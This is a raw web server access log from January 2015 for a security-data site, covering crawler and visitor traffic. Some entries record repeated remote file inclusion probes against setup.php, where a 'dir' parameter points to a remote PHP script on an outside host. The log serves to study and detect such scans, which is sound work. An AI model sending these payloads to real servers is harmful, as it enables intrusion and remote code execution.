104.130.160.87 - - [31/Jan/2015:02:03:09 -0800] "GET /honeypot//setup.php HTTP/1.1" 301 460 "-" "Tornado-Async-Client" 
104.130.160.87 - - [31/Jan/2015:02:03:09 -0800] "GET /honeypot//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.20.53 - - [31/Jan/2015:02:03:10 -0800] "GET /honeypot//setup.php HTTP/1.1" 301 460 "-" "Tornado-Async-Client" 
104.130.20.53 - - [31/Jan/2015:02:03:10 -0800] "GET /honeypot//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.20.53 - - [31/Jan/2015:02:03:18 -0800] "GET //setup.php HTTP/1.1" 301 441 "-" "Tornado-Async-Client" 
104.130.20.53 - - [31/Jan/2015:02:03:18 -0800] "GET /setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.160.87 - - [31/Jan/2015:02:03:19 -0800] "GET //setup.php HTTP/1.1" 301 441 "-" "Tornado-Async-Client" 
104.130.160.87 - - [31/Jan/2015:02:03:19 -0800] "GET /setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
66.249.79.2 - - [31/Jan/2015:02:43:57 -0800] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 200 128116 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
104.130.160.87 - - [31/Jan/2015:02:50:13 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.160.87 - - [31/Jan/2015:02:50:13 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
176.31.252.38 - - [31/Jan/2015:03:07:44 -0800] "GET /honeypot//setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
176.31.252.38 - - [31/Jan/2015:03:07:45 -0800] "GET /honeypot//setup.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
176.31.252.38 - - [31/Jan/2015:03:07:46 -0800] "POST /honeypot//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
176.31.252.38 - - [31/Jan/2015:03:07:47 -0800] "POST /honeypot//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
176.31.252.38 - - [31/Jan/2015:03:07:48 -0800] "GET //setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
176.31.252.38 - - [31/Jan/2015:03:07:49 -0800] "GET //setup.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
176.31.252.38 - - [31/Jan/2015:03:07:51 -0800] "POST //setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
176.31.252.38 - - [31/Jan/2015:03:07:52 -0800] "POST //setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
176.31.252.38 - - [31/Jan/2015:03:20:00 -0800] "GET /honeypot//setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [31/Jan/2015:03:20:01 -0800] "GET /honeypot//setup.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [31/Jan/2015:03:20:02 -0800] "POST /honeypot//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [31/Jan/2015:03:20:03 -0800] "POST /honeypot//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [31/Jan/2015:03:20:04 -0800] "GET //setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [31/Jan/2015:03:20:06 -0800] "GET //setup.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [31/Jan/2015:03:20:07 -0800] "POST //setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [31/Jan/2015:03:20:08 -0800] "POST //setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [31/Jan/2015:03:33:57 -0800] "GET /honeypot//setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:03:33:58 -0800] "GET /honeypot//setup.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:03:34:00 -0800] "POST /honeypot//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:03:34:01 -0800] "POST /honeypot//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:03:34:02 -0800] "GET //setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:03:34:03 -0800] "GET //setup.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:03:34:04 -0800] "POST //setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:03:34:05 -0800] "POST //setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:03:38:31 -0800] "GET /honeypot//setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)" 
176.31.252.38 - - [31/Jan/2015:03:38:32 -0800] "GET /honeypot//setup.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)" 
176.31.252.38 - - [31/Jan/2015:03:38:33 -0800] "POST /honeypot//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)" 
176.31.252.38 - - [31/Jan/2015:03:38:34 -0800] "POST /honeypot//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)" 
176.31.252.38 - - [31/Jan/2015:03:38:36 -0800] "GET //setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)" 
176.31.252.38 - - [31/Jan/2015:03:38:37 -0800] "GET //setup.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)" 
176.31.252.38 - - [31/Jan/2015:03:38:38 -0800] "POST //setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)" 
176.31.252.38 - - [31/Jan/2015:03:38:39 -0800] "POST //setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)" 
66.249.79.151 - - [31/Jan/2015:03:59:44 -0800] "GET /maccdc2012/smtp.log.gz HTTP/1.1" 200 6908 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
176.31.252.38 - - [31/Jan/2015:04:04:50 -0800] "GET /honeypot//setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:04:04:52 -0800] "GET /honeypot//setup.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:04:04:53 -0800] "POST /honeypot//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:04:04:54 -0800] "POST /honeypot//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:04:04:55 -0800] "GET //setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:04:04:56 -0800] "GET //setup.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:04:04:57 -0800] "POST //setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [31/Jan/2015:04:04:59 -0800] "POST //setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
85.4.15.216 - - [31/Jan/2015:04:13:53 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Linux; Android 4.4.2; GT-I9505 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.93 Mobile Safari/537.36" 
85.4.15.216 - - [31/Jan/2015:04:13:54 -0800] "GET / HTTP/1.1" 200 6629 "-" "Mozilla/5.0 (Linux; Android 4.4.2; GT-I9505 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.93 Mobile Safari/537.36" 
85.4.15.216 - - [31/Jan/2015:04:13:54 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 4.4.2; GT-I9505 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.93 Mobile Safari/537.36" 
85.4.15.216 - - [31/Jan/2015:04:13:55 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Linux; Android 4.4.2; GT-I9505 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.93 Mobile Safari/537.36" 
213.130.19.157 - - [31/Jan/2015:05:15:27 -0800] "GET / HTTP/1.1" 200 6629 "http://www.voltaa.com:888/cyberpublications/resolver" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36" 
213.130.19.157 - - [31/Jan/2015:05:15:27 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36" 
213.130.19.157 - - [31/Jan/2015:05:15:30 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36" 
104.130.160.87 - - [31/Jan/2015:05:24:24 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.160.87 - - [31/Jan/2015:05:24:24 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
104.207.136.120 - - [31/Jan/2015:05:39:02 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0" 
104.207.136.120 - - [31/Jan/2015:05:39:47 -0800] "GET /honeypot/%5C%22http://www.maxmind.com%5C HTTP/1.1" 404 339 "http://www.secrepo.com/honeypot/BSidesDFW%20-%202014.ipynb" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0" 
104.207.136.120 - - [31/Jan/2015:05:39:47 -0800] "GET / HTTP/1.1" 200 6628 "http://www.secrepo.com/honeypot/BSidesDFW%20-%202014.ipynb" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0" 
79.133.217.242 - - [31/Jan/2015:05:45:50 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0" 
199.192.207.146 - - [31/Jan/2015:05:58:55 -0800] "GET /robots.txt HTTP/1.0" 200 252 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
199.192.207.146 - - [31/Jan/2015:05:58:56 -0800] "GET /honeypot//%22http://amunhoney.sourceforge.net//%22 HTTP/1.0" 404 284 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
199.192.207.146 - - [31/Jan/2015:05:58:57 -0800] "GET /honeypot//%22http://glastopf.org//%22 HTTP/1.0" 404 303 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
199.192.207.146 - - [31/Jan/2015:05:58:59 -0800] "GET /honeypot//%22http://www.maxmind.com/%22 HTTP/1.0" 404 303 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
199.192.207.146 - - [31/Jan/2015:05:59:00 -0800] "GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.0" 404 303 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
199.192.207.146 - - [31/Jan/2015:05:59:02 -0800] "GET /honeypot//%22https://twitter.com/theroxyd/%22 HTTP/1.0" 404 303 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
72.191.40.245 - - [31/Jan/2015:06:03:55 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36" 
72.191.40.245 - - [31/Jan/2015:06:03:56 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 206 33099 "http://www.secrepo.com/honeypot/Honeypot%20-%20Howto.pdf" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36" 
72.191.40.245 - - [31/Jan/2015:06:03:56 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36" 
72.191.40.245 - - [31/Jan/2015:06:03:56 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 206 1246706 "http://www.secrepo.com/honeypot/Honeypot%20-%20Howto.pdf" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36" 
199.168.141.172 - - [31/Jan/2015:06:14:32 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 354780 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.0.3705)" 
157.55.39.62 - - [31/Jan/2015:06:18:45 -0800] "GET / HTTP/1.1" 200 6629 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
46.236.24.51 - - [31/Jan/2015:07:31:45 -0800] "GET / HTTP/1.1" 301 427 "-" "Mozilla/5.0 (TweetmemeBot/4.0; +http://datasift.com/bot.html) Gecko/20100101 Firefox/31.0" 
54.246.137.243 - - [31/Jan/2015:07:31:46 -0800] "HEAD / HTTP/1.1" 301 234 "-" "python-requests/1.2.3 CPython/2.7.6 Linux/3.13.0-44-generic" 
46.236.24.51 - - [31/Jan/2015:07:31:46 -0800] "GET / HTTP/1.1" 206 6620 "-" "Mozilla/5.0 (TweetmemeBot/4.0; +http://datasift.com/bot.html) Gecko/20100101 Firefox/31.0" 
54.246.137.243 - - [31/Jan/2015:07:31:46 -0800] "HEAD / HTTP/1.1" 200 262 "-" "python-requests/1.2.3 CPython/2.7.6 Linux/3.13.0-44-generic" 
184.169.203.101 - - [31/Jan/2015:07:31:47 -0800] "HEAD / HTTP/1.1" 301 246 "-" "Google-HTTP-Java-Client/1.17.0-rc (gzip)" 
50.18.102.132 - - [31/Jan/2015:07:31:47 -0800] "HEAD / HTTP/1.1" 200 295 "-" "Google-HTTP-Java-Client/1.17.0-rc (gzip)" 
184.169.203.101 - - [31/Jan/2015:07:31:48 -0800] "HEAD / HTTP/1.1" 301 246 "-" "Google-HTTP-Java-Client/1.17.0-rc (gzip)" 
46.236.26.103 - - [31/Jan/2015:07:31:55 -0800] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (TweetmemeBot/4.0; +http://datasift.com/bot.html) Gecko/20100101 Firefox/31.0" 
46.236.26.103 - - [31/Jan/2015:07:31:55 -0800] "GET / HTTP/1.1" 206 21179 "-" "Mozilla/5.0 (TweetmemeBot/4.0; +http://datasift.com/bot.html) Gecko/20100101 Firefox/31.0" 
107.22.72.145 - - [31/Jan/2015:07:31:55 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36" 
107.22.72.145 - - [31/Jan/2015:07:31:55 -0800] "GET / HTTP/1.1" 200 6629 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36" 
54.198.122.232 - - [31/Jan/2015:07:32:03 -0800] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6) AppleWebKit/534.24 (KHTML, like Gecko) (Contact: backend@getprismatic.com)" 
54.198.122.232 - - [31/Jan/2015:07:32:03 -0800] "GET / HTTP/1.1" 200 6592 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6) AppleWebKit/534.24 (KHTML, like Gecko) (Contact: backend@getprismatic.com)" 
74.6.254.140 - - [31/Jan/2015:07:32:40 -0800] "GET /robots.txt HTTP/1.1" 301 462 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
74.6.254.140 - - [31/Jan/2015:07:32:40 -0800] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
74.6.254.95 - - [31/Jan/2015:07:32:40 -0800] "GET /robots.txt HTTP/1.1" 304 130 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
74.6.254.95 - - [31/Jan/2015:07:32:41 -0800] "GET / HTTP/1.1" 304 133 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
17.142.152.108 - - [31/Jan/2015:07:32:46 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Getter/0.1)" 
17.142.152.108 - - [31/Jan/2015:07:32:46 -0800] "GET / HTTP/1.1" 200 6629 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Getter/0.1)" 
17.142.152.108 - - [31/Jan/2015:07:32:46 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Getter/0.1)" 
17.142.152.108 - - [31/Jan/2015:07:32:47 -0800] "GET / HTTP/1.1" 200 6629 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Getter/0.1)" 
74.112.131.246 - - [31/Jan/2015:07:32:58 -0800] "GET / HTTP/1.1" 200 6629 "-" "Mozilla/5.0 ()" 
74.112.131.241 - - [31/Jan/2015:07:33:00 -0800] "GET / HTTP/1.1" 200 6629 "-" "Mozilla/5.0 ()" 
150.70.173.48 - - [31/Jan/2015:07:33:26 -0800] "GET / HTTP/1.1" 301 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 
74.207.243.172 - - [31/Jan/2015:07:37:20 -0800] "HEAD / HTTP/1.1" 301 246 "-" "Java/1.7.0_71" 
74.207.243.172 - - [31/Jan/2015:07:37:20 -0800] "HEAD / HTTP/1.1" 200 295 "-" "Java/1.7.0_71" 
37.59.35.153 - - [31/Jan/2015:07:39:55 -0800] "GET /robots.txt HTTP/1.1" 301 502 "-" "Mozilla/5.0 (compatible; Kraken/0.1; http://linkfluence.net/; bot@linkfluence.net)" 
37.59.35.153 - - [31/Jan/2015:07:39:56 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Kraken/0.1; http://linkfluence.net/; bot@linkfluence.net)" 
153.120.3.195 - - [31/Jan/2015:07:42:10 -0800] "GET / HTTP/1.1" 301 427 "-" "HTTP_Request2/2.2.1 (http://pear.php.net/package/http_request2) PHP/5.5.21" 
153.120.3.195 - - [31/Jan/2015:07:42:10 -0800] "GET / HTTP/1.1" 200 6573 "-" "HTTP_Request2/2.2.1 (http://pear.php.net/package/http_request2) PHP/5.5.21" 
133.18.5.180 - - [31/Jan/2015:07:47:23 -0800] "GET / HTTP/1.1" 301 461 "-" "CakePHP" 
133.18.5.180 - - [31/Jan/2015:07:47:24 -0800] "GET / HTTP/1.1" 200 21175 "-" "CakePHP" 
104.130.161.37 - - [31/Jan/2015:08:04:44 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.37 - - [31/Jan/2015:08:04:44 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
166.137.246.111 - - [31/Jan/2015:08:22:03 -0800] "GET / HTTP/1.1" 200 6629 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4" 
166.137.246.111 - - [31/Jan/2015:08:22:03 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4" 
66.249.79.159 - - [31/Jan/2015:08:24:59 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.79.159 - - [31/Jan/2015:08:25:00 -0800] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 45018 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
157.55.39.62 - - [31/Jan/2015:08:37:08 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.249.79.151 - - [31/Jan/2015:09:21:50 -0800] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 16151610 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
68.62.189.62 - - [31/Jan/2015:10:04:33 -0800] "GET / HTTP/1.1" 200 6629 "-" "Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4" 
68.62.189.62 - - [31/Jan/2015:10:04:34 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4" 
207.46.13.97 - - [31/Jan/2015:10:06:38 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 631059 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.210 - - [31/Jan/2015:10:07:21 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 97980 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
104.130.20.53 - - [31/Jan/2015:10:20:05 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.20.53 - - [31/Jan/2015:10:20:05 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
112.218.68.155 - - [31/Jan/2015:10:27:01 -0800] "GET //setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)" 
112.218.68.155 - - [31/Jan/2015:10:27:03 -0800] "POST //setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)" 
192.99.40.137 - - [31/Jan/2015:11:11:11 -0800] "HEAD / HTTP/1.1" 200 318 "http://www.domaintuno.com/d/www.secrepo.com" "Mozilla/5.0 (compatible; DomainTunoCrawler/0.1; +http://www.domaintuno.com/robot)" 
81.200.27.2 - - [31/Jan/2015:11:33:20 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; TweetedTimes Bot/1.0 (resolver); +http://tweetedtimes.com)" 
81.200.27.2 - - [31/Jan/2015:11:33:23 -0800] "GET / HTTP/1.1" 200 6629 "-" "Mozilla/5.0 (compatible; TweetedTimes Bot/1.0 (resolver); +http://tweetedtimes.com)" 
104.130.161.37 - - [31/Jan/2015:11:39:27 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.37 - - [31/Jan/2015:11:39:27 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
157.55.39.210 - - [31/Jan/2015:11:46:50 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 93720 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.97 - - [31/Jan/2015:11:48:38 -0800] "GET /self.logs/ HTTP/1.1" 200 800 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
